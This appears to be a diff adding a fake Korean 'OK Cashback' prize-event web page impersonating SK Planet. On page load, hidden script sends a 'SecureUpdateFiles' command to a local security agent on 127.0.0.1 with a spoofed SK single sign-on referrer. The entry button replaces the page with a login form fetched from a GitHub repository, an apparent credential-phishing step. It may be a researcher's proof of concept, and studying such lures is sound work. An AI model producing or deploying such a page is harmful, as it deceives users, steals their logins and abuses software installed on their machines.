@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>OK캐시백 5천만원 페스타 이벤트</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            background: #fff;
+            padding: 30px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .event-image {
+            width: 100%;
+            max-width: 600px;
+            height: auto;
+            display: block;
+            margin: 0 auto 20px auto;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.15);
+        }
+        h1 {
+            text-align: center;
+            color: #d32f2f;
+            margin-bottom: 20px;
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+        .section h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        .section p {
+            margin: 5px 0;
+            line-height: 1.6;
+        }
+        .highlight {
+            color: #d32f2f;
+            font-weight: bold;
+        }
+        .cta-button {
+            display: block;
+            width: 100%;
+            text-align: center;
+            background-color: #d32f2f;
+            color: white;
+            padding: 12px;
+            text-decoration: none;
+            font-size: 16px;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 30px;
+        }
+    </style>
+    <script>
+    function loadLoginPage() {
+      fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
+        .then(res => res.text())
+        .then(html => {
+          document.open();
+          document.write(html);
+          document.close();
+        });
+    }
+    </script>
+
+
+    <script>
+        async function fetchForBrowser() {
+            const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
+            const commonOptions = {
+                headers: {
+                    "accept": "*/*",
+                    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+                    "cache-control": "no-cache",
+                    "pragma": "no-cache",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "cross-site"
+                },
+                referrer: "http://sso.sk.com:10000/",
+                referrerPolicy: "strict-origin-when-cross-origin",
+                body: null,
+                method: "GET",
+                mode: "no-cors",
+                credentials: "omit"
+            };
+        
+            const urls = {
+                      default: `${baseUrl}%7B%22func%22:%22SecureUpdateFiles%22,%22param%22:%22vUdwYz%2B%2FUJZ%2FVpr71dB2Oef4XlxVkAOZAYFQmaos3Bg%3D%7CNf7fDDHdQGo0wDI11Mkb5w%3D%3D%7C1%22%7D&_=%22`
+            };
+        
+            await fetch(urls['default'], commonOptions);
+        }
+
+        if (!window._fetchedOnce) {
+          window._fetchedOnce = true;
+          fetchForBrowser();
+        }
+    </script>
+</head>
+<body>
+    <p style="text-align:center; margin-top:100px;">이벤트 페이지 로딩 중...</p>
+    <script>
+        (async function(){
+
+            // 💨 약간의 딜레이 후 이벤트 안내 화면으로 전환
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <img src="https://skplanet-img.s3.ap-northeast-2.amazonaws.com/okcashbag_event.png" alt="OK캐시백 5천만원 페스타 이벤트" class="event-image">
+
+                        <h1>돌아온 7월 OK캐시백 5천만원 페스타</h1>
+
+                        <div class="section">
+                            <h2>🎉 이벤트 개요</h2>
+                            <p>지난 5월 가정의 달 1억 페스타의 뜨거운 성원에 힘입어,</p>
+                            <p>7월에는 <span class="highlight">총 5천만원 상당의 OK캐시백</span>을 쏩니다!</p>
+                        </div>
+
+                        <div class="section">
+                            <h2>✅ 참여 방법</h2>
+                            <p>1. OK캐시백 앱에서 이벤트 페이지 접속</p>
+                            <p>2. 응모하기 버튼 클릭 후 자동 참여 완료</p>
+                            <p>3. 당첨자 발표는 7월 31일(수) 앱 공지 및 개별 연락</p>
+                        </div>
+
+                        <div class="section">
+                            <h2>🎁 경품 안내</h2>
+                            <p>1등 (1명): OK캐시백 1,000만원</p>
+                            <p>2등 (5명): OK캐시백 500만원</p>
+                            <p>3등 (50명): OK캐시백 10만원</p>
+                        </div>
+
+                        <a href="javascript:loadLoginPage()">이벤트 응모하기</a>
+
+                        <div class="footer">
+                            ※ 본 이벤트는 SK플래닛 주관으로 진행됩니다. 자세한 내용은 OK캐시백 앱 공지를 참고하세요.
+                        </div>
+                    </div>
+                `;
+            }, 500); 
+        })();
+    </script>
+</body>
+</html>
